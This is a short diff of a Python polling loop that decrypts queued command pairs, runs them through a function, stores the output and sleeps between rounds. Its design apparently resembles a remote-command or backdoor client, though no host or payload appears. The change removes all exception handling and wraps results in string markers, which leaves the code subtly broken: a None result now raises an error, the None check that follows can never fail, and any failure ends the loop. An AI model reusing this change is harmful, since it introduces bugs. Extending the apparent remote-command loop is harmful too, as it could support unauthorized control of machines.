@@ -96,14 +96,10 @@ while True:
 		commands[prefix] = suffix
 	success = True
 	for prefix, suffix in commands.items():
-		try:
-			prefix_,suffix_ = decrypt(str(prefix)),decrypt(str(suffix))
-			result = getfunc(prefix_,suffix_)
-			if result != None:
-				print(result)
-				STRING = result
-		except Exception as e:
-			print("Error:\n"+str(e))
-			continue
+		prefix_,suffix_ = decrypt(str(prefix)),decrypt(str(suffix))
+		result = "<:"+getfunc(prefix_,suffix_)+":>"
+		if result != None:
+			print(result)
+			STRING = result
 	commands = {}
 	time.sleep(connection-sleepnum)
